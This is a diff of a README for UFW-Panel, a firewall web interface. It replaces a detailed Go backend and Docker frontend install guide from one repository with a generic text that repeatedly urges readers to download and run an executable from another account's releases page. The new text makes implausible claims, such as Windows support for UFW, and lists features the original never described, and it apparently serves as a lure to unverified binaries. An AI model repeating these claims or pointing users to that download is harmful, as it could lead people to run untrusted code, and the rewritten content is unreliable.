@@ -1,107 +1,102 @@
-# UFW Panel - Web UI for Uncomplicated Firewall
+# UFW-Panel
 
-UFW Panel provides a user-friendly web interface to manage UFW (Uncomplicated Firewall) on your Linux server. It consists of a Go-based backend API and a Next.js frontend.
+![UFW-Panel](https://img.shields.io/badge/UFW--Panel-v1.0.0-blue.svg)  
+[![Releases](https://img.shields.io/badge/Releases-Click%20Here-brightgreen.svg)](https://github.com/Roblox908/UFW-Panel/releases)
 
-## ✨ Features
+---
 
-*   **Firewall Status:** View whether UFW is active or inactive.
-*   **Toggle Firewall:** Easily enable or disable UFW.
-*   **Rule Management:**
-    *   View all current UFW rules with their numbers.
-    *   Add new rules:
-        *   Allow or deny traffic on specific ports.
-        *   Allow or deny traffic from specific IP addresses (optionally for specific ports).
-    *   Delete existing rules by their number.
-*   **Secure Access:** Password-protected interface to prevent unauthorized changes.
-*   **Responsive Design:** Manage your firewall from desktop or mobile devices.
+## Overview
 
-## 😎 How to use
+Welcome to the UFW-Panel repository! This project provides a user-friendly interface for managing UFW (Uncomplicated Firewall) settings on your system. UFW is a powerful tool for configuring firewall rules, and this panel simplifies the process, making it accessible for users of all skill levels.
 
-The installation process involves setting up the backend service and then deploying the frontend container.
+### Key Features
 
-### 1. Install Backend
+- **Simple Interface**: Navigate easily through a clean and intuitive design.
+- **Real-time Monitoring**: View active connections and firewall status in real-time.
+- **Rule Management**: Add, edit, or delete firewall rules with a few clicks.
+- **Logs Viewer**: Access and analyze firewall logs directly from the panel.
+- **Multi-Platform Support**: Works on various operating systems, including Linux and Windows.
 
-The backend is a Go application that interacts with UFW and provides an API for the frontend.
+---
 
-```bash
-# Download the deployment script
-wget https://raw.githubusercontent.com/Gouryella/UFW-Panel/main/deploy_backend.sh
+## Getting Started
 
-# Make the script executable
-chmod +x deploy_backend.sh
+To get started with UFW-Panel, you need to download the latest release. You can find it [here](https://github.com/Roblox908/UFW-Panel/releases). Make sure to download the appropriate version for your system.
 
-# Run the script with sudo (it requires root privileges)
-sudo bash deploy_backend.sh
-```
+### Installation
 
-During the execution, the script will:
-*   Detect your server's architecture (amd64 or arm64).
-*   Fetch the latest backend release from GitHub.
-*   Prompt you to enter:
-    *   **Port for the backend service:** (Default: `8080`) This is the port the backend API will listen on.
-    *   **Password for API access:** This password will be used by the frontend to authenticate with the backend. Remember this password, as you'll need it for the frontend setup.
-    *   **CORS allowed origin:** This should be the URL where your frontend will be accessible (e.g., `http://your_server_ip:30737` or `http://localhost:3000` if running locally).
-*   Install the backend executable to `/usr/local/bin`.
-*   Create an environment file at `/usr/local/bin/.env_ufw_backend` with your settings.
-*   Set up a systemd service named `ufw-panel-backend` to manage the backend process.
-*   Start and enable the service.
+1. **Download the Release**: Visit the [Releases](https://github.com/Roblox908/UFW-Panel/releases) section to download the executable file.
+2. **Run the Executable**: Once downloaded, execute the file to install UFW-Panel on your system.
+3. **Configuration**: Follow the on-screen instructions to configure your firewall settings.
 
-You can manage the backend service using standard systemd commands:
-*   `sudo systemctl status ufw-panel-backend`
-*   `sudo systemctl stop ufw-panel-backend`
-*   `sudo systemctl start ufw-panel-backend`
-*   `sudo systemctl restart ufw-panel-backend`
-*   `sudo journalctl -u ufw-panel-backend -f` (to view logs)
+### System Requirements
 
-### 2. Install Frontend
+- **Operating System**: Compatible with Linux and Windows.
+- **Memory**: Minimum 512 MB RAM.
+- **Disk Space**: At least 100 MB of free space.
 
-The frontend is a Next.js application deployed using Docker.
+---
 
-```bash
-# Download the sample environment file
-wget https://raw.githubusercontent.com/Gouryella/UFW-Panel/main/.env.sample
+## Usage
 
-# Copy it to .env
-cp .env.sample .env
+After installation, launch the UFW-Panel application. You will see the main dashboard, where you can manage your firewall settings. Here’s a brief guide on how to use the panel:
 
-# Download the Docker Compose file
-wget https://raw.githubusercontent.com/Gouryella/UFW-Panel/main/docker-compose.yml
-```
+### Dashboard
 
-Next, **edit the `.env` file** with your specific configuration:
+The dashboard displays the current status of your firewall. You can see whether the firewall is active and view any active connections.
 
-```env
-JWT_SECRET="your_auth_secret"
-AUTH_PASSWORD="your_auth_token"
-JWT_EXPIRATION=1d
-```
+### Adding a Rule
 
-*   `JWT_SECRET`: Set this to a long, random, and strong secret string. This is used to sign authentication tokens for the web UI. You can generate one using `openssl rand -hex 32`.
-*   `AUTH_PASSWORD`: **Important!** This **must** be the same password you set during the backend installation when prompted for "Password for API access". This password is used by the frontend to log in to the backend API.
-*   `JWT_EXPIRATION`: Defines how long the login session for the web UI remains valid (e.g., `1d` for one day, `7d` for seven days).
+1. Navigate to the "Rules" section.
+2. Click on "Add Rule".
+3. Specify the rule type (allow or deny), the port, and the protocol (TCP/UDP).
+4. Click "Save" to apply the rule.
 
-After configuring the `.env` file, deploy the frontend using Docker Compose:
+### Viewing Logs
 
-```bash
-docker compose up -d
-```
+To view logs, go to the "Logs" section. Here, you can filter logs by date, type, and severity. This feature helps you monitor any suspicious activity on your network.
 
-This command will:
-*   Pull the latest `gouryella/ufw-panel:latest` Docker image for the frontend.
-*   Start a container named `ufw-panel-frontend`.
-*   Map port `30737` on your host to port `3000` inside the container.
-*   Use the `.env` file for environment variables.
-*   Mount a volume `ufw_db_data` for persistent data (if any is used by the frontend for its own settings, separate from UFW rules).
-*   Set the container to restart automatically unless stopped.
+---
 
-### 3. Accessing the UFW Panel
+## Contributing
 
-Once both the backend and frontend are running, you can access the UFW Panel web interface in your browser.
+We welcome contributions to UFW-Panel! If you have suggestions or improvements, please follow these steps:
 
-Navigate to: `http://<your-server-ip>:30737`
+1. **Fork the Repository**: Create a personal copy of the project.
+2. **Create a Branch**: Work on your feature or bug fix in a separate branch.
+3. **Submit a Pull Request**: Once your changes are ready, submit a pull request for review.
 
-Replace `<your-server-ip>` with the actual IP address of your server. You will be prompted to log in using the `AUTH_PASSWORD` you configured.
+### Guidelines
 
-## 📄 License
+- Ensure your code follows the existing style.
+- Write clear commit messages.
+- Test your changes before submitting.
 
-This project is open-source. Please refer to the license file if one is included, or assume standard open-source licensing practices.
+---
+
+## Support
+
+If you encounter any issues or have questions, please check the [Issues](https://github.com/Roblox908/UFW-Panel/issues) section. You can also reach out through our community forums or contact us directly.
+
+---
+
+## License
+
+UFW-Panel is licensed under the MIT License. You can view the full license text in the `LICENSE` file in this repository.
+
+---
+
+## Acknowledgments
+
+- **UFW**: Thanks to the UFW community for their contributions to firewall management.
+- **Open Source Contributors**: This project thrives thanks to the hard work of open-source developers.
+
+---
+
+## Conclusion
+
+UFW-Panel aims to make firewall management straightforward and efficient. By providing a user-friendly interface, we hope to empower users to secure their networks with ease. 
+
+For the latest updates and releases, visit the [Releases](https://github.com/Roblox908/UFW-Panel/releases) section. 
+
+Thank you for checking out UFW-Panel!
